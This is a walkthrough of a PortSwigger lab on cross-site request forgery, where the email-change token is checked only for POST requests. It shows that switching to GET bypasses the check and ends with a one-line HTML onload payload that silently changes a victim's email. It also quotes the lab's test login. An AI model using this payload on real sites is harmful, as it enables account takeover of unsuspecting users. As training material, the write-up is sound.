
# CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

Reference: https://portswigger.net/web-security/csrf

---------------------------------------------

Generated link: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/




**Pic 1**



**Pic 2**

The email-change operation is sent as a POST request:



**Pic 3**

Next, try sending the same operation with the GET method:

/my-account/change-email?email=test3%40test.com




**Pic 4**

The server responds with a redirect. Following that redirect completes the email update:



**Pic 5**



**Pic 6**


The resulting payload is:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```



**Pic 7**
